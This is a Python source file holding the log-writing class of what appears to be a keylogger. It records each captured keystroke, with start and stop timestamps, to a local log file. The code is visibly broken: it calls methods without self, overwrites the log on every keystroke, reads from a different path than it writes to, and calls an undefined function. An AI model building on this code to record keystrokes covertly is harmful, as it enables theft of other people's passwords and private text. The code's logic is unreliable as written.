
class write_Read : 
    
    def __init__(self):
        pass
    
    '''
    Reads the file to check if the last character
    ended with a space or not
    '''
    def read_file(self):
        noSpace = False
        with open("log.txt", "r") as r:
            last_Character = r.read()[-1]
            if last_Character == ' ':
                noSpace = True
            else:
                noSpace = False

        return noSpace

    # writes to the file log.txt for each captured key
    def write_file(self,key, Key):

        with open("./Logs/log.txt", "w") as f:

            # removes the quotation marks from being captured
            k = str(key).replace("'", "")

            # removes the word space
            if k == str(Key.space):
                isTrue = read_file()
                if isTrue == True:
                    pass
                else:
                    f.write(' ')
            else:
                if k.find("Key") == -1:
                    f.write(k)
                else:
                    pass

    # writes the time captured at the beginning
    def time_Start(self,beginning):
        with open("./Logs/log.txt", "w") as time:
            time.write(f"Began {format(beginning)}")

    # writes the time captured at the end
    def time_end(self,end):
        with open("./Logs/log.txt", "w") as time:
            time.write(f"\nStopped {__str__(end)}\n")
            time.write("************************************************************\n\n")

    # returns a string
    def format(self,time):
        return (f"typing at : {time.day} {time.month} {time.year}"
                f"{time.hour}:{time.minute}:{time.second}")

